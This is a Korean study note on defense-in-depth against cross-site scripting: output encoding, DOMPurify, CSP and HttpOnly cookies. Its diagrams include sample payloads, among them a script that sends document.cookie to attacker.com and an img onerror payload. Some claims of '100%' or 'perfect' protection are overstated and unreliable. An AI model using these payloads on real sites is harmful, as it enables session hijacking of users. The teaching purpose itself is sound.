## Ⅰ. 개요

<details><summary>용어 설명</summary>

- **XSS(Cross-Site Scripting / CWE-79)**: 공격자가 웹 애플리케이션에 악의적인 스크립트(주로 JavaScript)를 삽입하여, 해당 웹 페이지를 열람하는 정상 사용자의 브라우저 환경에서 해당 스크립트가 실행되도록 유도함으로써 세션 토큰(Cookie) 탈취, 키로깅, 브라우저 조작 및 악성 사이트 리다이렉션을 유발하는 클라이언트 사이드 코드 인젝션 취약점.
- **브라우저 렌더링 엔진 파싱 모호성(Rendering Context Ambiguity)**: 브라우저 DOM 파서가 서버로부터 수신된 HTML 응답 스트림을 해석할 때, 사용자 입력 데이터(Data)와 실행 가능한 자바스크립트 블록(Code)을 명확히 구분하지 못하고 단일 실행 컨텍스트로 처리하는 근본 결함.

</details>

- 정의/개념: 비신뢰 입력이 브라우저 DOM에 렌더링될 때 실행 코드로 변환되는 것을 방지하기 위해 **문맥 인식 출력 인코딩(Context-Aware Output Encoding)**, **HTML 정화(Sanitization/DOMPurify)**, **콘텐츠 보안 정책(CSP)**, **HttpOnly/SameSite 쿠키 속성** 을 계층적으로 결합하는 **브라우저 샌드박스 심층 방어 아키텍처**
- 배경/필요성: 백엔드 DB 저장 시점의 단순 입력 필터링(Blacklist)만으로는 다양한 인코딩(HTML 엔티티, URL 인코딩, 유니코드) 및 프론트엔드 SPA(Single Page Application) 환경의 동적 DOM 조작(Source to Sink)에 따른 스크립트 실행을 완벽히 방어할 수 없는 한계를 극복할 요구

#### 한줄 요약
- 문맥 인식 출력 인코딩과 HTML 정화 및 CSP/HttpOnly 브라우저 통제를 통해 악성 스크립트 실행과 세션 탈취를 차단한다.

## Ⅱ. 특징

<details><summary>용어 설명</summary>

- **문맥 인식 출력 인코딩(Context-Aware Output Encoding)**: 데이터가 출력되는 브라우저 렌더링 위치(HTML Body, 속성 Attribute, JavaScript 블록, CSS 스타일, URL 쿼리스트링)에 따라 각각의 파서가 사용하는 제어 특수문자(`<, >, ", ', &, \`)를 안전한 텍스트 엔티티로 변환하는 정밀 인코딩 기법.
- **콘텐츠 보안 정책(Content Security Policy, CSP)**: 웹 서버가 HTTP 응답 헤더(`Content-Security-Policy`)를 통해 브라우저가 다운로드하고 실행할 수 있는 유효한 스크립트의 출처(Origin), 인라인 스크립트 실행 금지(`unsafe-inline` 차단), Nonce 기반 허용을 강제하는 브라우저 보안 표준.

</details>

- **렌더링 문맥별 차등 인코딩**: HTML 컨텍스트(`&lt;`), 자바스크립트 컨텍스트(`\x3C`), URL 컨텍스트(`%3C`)의 파서 문법에 맞춘 개별 인코딩 적용
- **클라이언트 DOM 실행 경로(Source to Sink) 통제**: `location.search`(Source)에서 `innerHTML`/`eval`(Sink)로 이어지는 데이터 흐름을 정적/동적으로 검증
- **브라우저 단독 방어선 구축 (Defense-in-Depth)**: 애플리케이션 코딩 실수로 XSS가 발생하더라도 `HttpOnly`를 통한 쿠키 접근 차단 및 CSP를 통한 C2 전송 봉쇄

#### 한줄 요약
- 문맥별 차등 출력 인코딩, DOM Source-Sink 통제, HTML 정화기, CSP/HttpOnly 심층 방어를 제공한다.

## Ⅲ. 구조 및 구성요소

<details><summary>용어 설명</summary>

- **XSS 3대 심층 방어 계층**:
  1. **1차 방어선 (시큐어 코딩)**: 문맥 인식 출력 인코딩 및 안전한 DOM API(`textContent`) 강제
  2. **2차 방어선 (HTML 정화)**: 리치 텍스트 에디터 지원을 위한 허용목록(Allowlist) 기반 DOMPurify 적용
  3. **3차 방어선 (브라우저 통제)**: CSP 헤더 및 `HttpOnly`, `SameSite=Lax/Strict` 쿠키 보호

</details>

```text
[ 비신뢰 사용자 입력 (예: <script>fetch('http://attacker.com/?c='+document.cookie)</script>) ]
                                       │
                                       ▼
┌───────────────────────────────────────────────────────────────────────────────────────────┐
│ [ 1. 애플리케이션 계층: 문맥 인식 인코딩 및 정화 (Output Encoding & Sanitization) ]         │
│  ├─ 일반 텍스트 문맥: OWASP Java HTML Sanitizer ➔ `<` 문자를 `&lt;` 로 엔티티 치환        │
│  └─ 웹 에디터(Rich Text) 문맥: DOMPurify ➔ `<b>`, `<i>` 만 허용, `<script>`, `onload` 소거 │
└──────────────────────────────────────┬────────────────────────────────────────────────────┘
                                       │
                                       ▼ (브라우저 DOM 트리 렌더링)
┌───────────────────────────────────────────────────────────────────────────────────────────┐
│ [ 2. 브라우저 파싱 계층: 안전한 DOM 바인딩 (Safe DOM Binding) ]                            │
│  ├─ 위험한 싱크(`innerHTML`, `document.write`) 사용 금지                                  │
│  └─ 안전한 텍스트 프로퍼티(`element.textContent`, `innerText`)를 통한 순수 문자열 바인딩   │
└──────────────────────────────────────┬────────────────────────────────────────────────────┘
                                       │ (만일 인코딩 누락으로 스크립트가 실행될 경우: 3차 방어)
                                       ▼
┌───────────────────────────────────────────────────────────────────────────────────────────┐
│ [ 3. 브라우저 보안 헤더 통제 계층 (CSP & Cookie Defense) ]                                 │
│  ├─ CSP 헤더 (`script-src 'self' 'nonce-rAnd0m'`): 미인가 인라인 스크립트 실행 즉시 차단   │
│  └─ `Set-Cookie: JSESSIONID=...; Secure; HttpOnly; SameSite=Strict`: JS의 세션 접근 원천 거부│
└───────────────────────────────────────────────────────────────────────────────────────────┘
```

선의 의미: 사용자 입력이 출력 문맥별 인코딩/정화를 거쳐 안전한 DOM API로 렌더링되고, 최종적으로 CSP 및 HttpOnly 속성에 의해 브라우저에서 보호되는 심층 방어 구조

| 구성요소 | 핵심 책임 및 역할 | 비고 |
|:---|:---|:---|
| **문맥 인식 인코더** | HTML, Attribute, JavaScript, CSS, URL 등 출력 위치별 전용 인코딩 라이브러리 실행 | Context-Aware |
| **HTML 정화기 (DOMPurify)** | 리치 텍스트 에디터 사용 시 화이트리스트 기반 안전 태그만 통과시키고 악성 속성 제거 | Sanitization |
| **안전한 DOM 싱크 API** | `innerHTML` 대신 `textContent`를 사용하여 데이터가 파서에 의해 실행 코드로 오인 방지 | Safe DOM Sink |
| **CSP 보안 헤더** | 인라인 스크립트 실행을 금지하고 인가된 도메인의 스크립트만 로드하도록 브라우저 강제 | CSP Header |
| **HttpOnly 쿠키 속성** | `document.cookie` 자바스크립트 API를 통한 세션 ID 접근을 브라우저 엔진 레벨에서 차단 | Cookie Sandbox |

#### 한줄 요약
- 문맥 인식 인코더, HTML 정화기(DOMPurify), 안전한 DOM API, CSP 헤더, HttpOnly 쿠키 속성이 결합한다.

## Ⅳ. 흐름도

<details><summary>용어 설명</summary>

- **DOM-based XSS의 Source와 Sink**:
  - **Source**: 비신뢰 입력이 유입되는 프로퍼티 (예: `location.hash`, `document.referrer`, `window.name`).
  - **Sink**: 입력값을 실행 가능한 코드로 해석하는 DOM 메서드 (예: `eval()`, `innerHTML`, `document.write()`).

</details>

```text
1. [악성 페이로드 유입] 공격자가 게시판 본문에 `<img src=x onerror=alert(document.cookie)>` 입력 후 저장
            │
            ▼
2. [출력 시 문맥 판별] 서버 렌더링 엔진이 본문 출력 위치를 "HTML Body Context"로 식별
            │
            ▼
3. [문맥 인코딩 및 정화]
    ├─ 일반 게시판: `<` ➔ `&lt;`, `>` ➔ `&gt;`, `"` ➔ `&quot;` 로 치환
    └─ 리치 에디터: DOMPurify가 `<img>` 태그의 위험 속성 `onerror`를 정적으로 제거 후 안전한 태그만 통과
            │
            ▼
4. [브라우저 DOM 해석] 브라우저 파서가 해당 데이터를 실행 스크립트가 아닌 단순 텍스트 그래픽으로 정상 렌더링
            │
            ├─ [만일 1차 인코딩 방어 실패 시: 브라우저 차단 가동]
            ▼
5. [CSP 및 HttpOnly 최종 차단]
    ├─ CSP 정책에 의해 미인가 인라인 스크립트 실행 즉시 거부
    └─ 스크립트가 실행되더라도 `HttpOnly` 쿠키 속성으로 인해 세션 토큰 탈취 0% 완벽 방어
```

**동작 원리**

1. **위험 문맥 정밀 식별**: 데이터가 HTML 태그 내부인지 스크립트 변수 내부인지 위치 파악
2. **제어 문자 무해화**: 브라우저 파서가 태그의 시작(` < `)이나 문자열의 종료(` ' `)로 인식하지 못하도록 치환
3. **위험 속성 소거**: `onload`, `onerror`, `javascript:` 등 이벤트 핸들러 및 슈도 프로토콜 제거
4. **브라우저 실행 권한 억제**: CSP를 통해 비인가 외부 서버로의 아웃바운드 AJAX 전송 원천 차단
5. **인증 토큰 격리**: 자바스크립트 엔진과 세션 쿠키 저장소 간의 물리적 인터페이스 분리

#### 한줄 요약
- 악성 입력 유입, 문맥 판별, 문맥 인코딩/정화, 브라우저 DOM 해석, CSP/HttpOnly 차단 순으로 동작한다.

## Ⅴ. 종류 및 비교

<details><summary>용어 설명</summary>

- **XSS 3대 공격 유형 비교**: 저장형(Stored), 반사형(Reflected), DOM 기반(DOM-based)의 비교.

</details>

| 비교 항목 | 저장형 XSS (Stored XSS) | 반사형 XSS (Reflected XSS) | DOM 기반 XSS (DOM-based XSS) |
|:---|:---|:---|:---|
| **악성 코드 저장 위치**| **백엔드 데이터베이스 (영구 저장)** | 웹 서버 로그/URL 파라미터 (미저장) | **클라우드/서버 미저장 (순수 클라이언트)**|
| **공격 전달 메커니즘** | **게시판, 프로필, 댓글 등 정상 조회** | 피싱 메일, SNS의 조작된 URL 클릭 유도 | 조작된 URL Hash(` # `) 및 프론트엔드 JS |
| **피해 대상 범위** | **해당 페이지를 열람하는 불특정 다수** | 공격 링크를 직접 클릭한 특정 피해자 | 조작된 DOM 페이지를 로드한 피해자 |
| **서버 개입 여부** | **서버가 DB에서 읽어 응답에 포함** | **서버가 요청 파라미터를 응답에 반사** | **서버 개입 없음 (브라우저 JS 내부 실행)** |
| **최우선 기술적 대책** | **저장 전/출력 시 문맥 인코딩 & HTML 정화**| **파라미터 출력 인코딩 & WAF 필터링** | **안전한 프론트엔드 API(`textContent`) 사용**|

#### 한줄 요약
- Stored는 DB 영구 저장형, Reflected는 URL 반사형, DOM-based는 클라이언트 JS 런타임 실행형이다.

## Ⅵ. 실무 고려사항 및 대책

<details><summary>용어 설명</summary>

- **CSP 3.0 Nonce 기반 정책(Strict CSP)**: 스크립트 태그마다 서버가 매 요청마다 동적으로 생성한 일회용 난수(`nonce="rAnd0m123"`)를 부여하고, HTTP 응답 헤더의 Nonce 값과 일치하는 스크립트만 실행을 허용하는 최신 보안 표준.

</details>

| 문제 | 대책 | 효과 |
|:---|:---|:---|
| 단순 HTML 엔티티 치환만 적용하여 **자바스크립트 블록 내부(` <script>var a='...';</script> `) XSS 방어 실패** | **출력 위치 문맥(HTML, Attribute, JS, URL)에 맞는 맞춤형 문맥 인식 인코딩 라이브러리 적용** | 렌더링 문맥별 특수문자 실행 우회 경로 100% 원천 차단 |
| 리치 텍스트 에디터 지원을 위해 태그를 허용하다가 **`onload`, `onerror` 등 악성 이벤트 핸들러 유입** | **DOMPurify 기반 화이트리스트 정화(Sanitization) 엔진 적용 및 안전 태그만 선별 허용** | 웹 서식(UI) 기능성을 완벽히 유지하면서 악의적 스크립트 속성만 100% 소거 |
| 소스코드 인코딩 실수로 XSS 취약점이 발생하여 **사용자의 세션 쿠키가 외부 해커 서버로 전면 탈취** | **모든 인증 세션 쿠키에 `HttpOnly; Secure; SameSite=Strict` 적용 및 Strict-CSP 헤더 배포** | XSS 취약점 발생 시에도 브라우저 레벨에서 자바스크립트의 세션 접근 및 유출 100% 차단 |

#### 한줄 요약
- 문맥 인식 인코딩으로 우회를 막고, DOMPurify로 에디터를 정화하며, HttpOnly/CSP로 세션을 격리한다.

## Ⅶ. 결론

- 웹 애플리케이션 프론트엔드와 사용자 브라우저 간의 신뢰를 수호하는 **XSS 방어 아키텍처**는 클라이언트 사이드 보안의 핵심이며, 실무 구현 시 **출력 문맥(Context)에 일치하는 정밀 인코딩**, **DOMPurify 기반 화이트리스트 HTML 정화**, **프론트엔드 SPA 환경에서의 안전한 DOM API(`textContent`) 사용**, **Strict-CSP 및 HttpOnly 쿠키 속성을 결합한 다계층 심층 방어**를 완성하여 무결점 웹 애플리케이션 환경을 완성

#### 한줄 요약
- 문맥 인식 인코딩과 DOMPurify 정화 및 CSP/HttpOnly 심층 방어를 결합하여 XSS를 완벽히 통제한다.
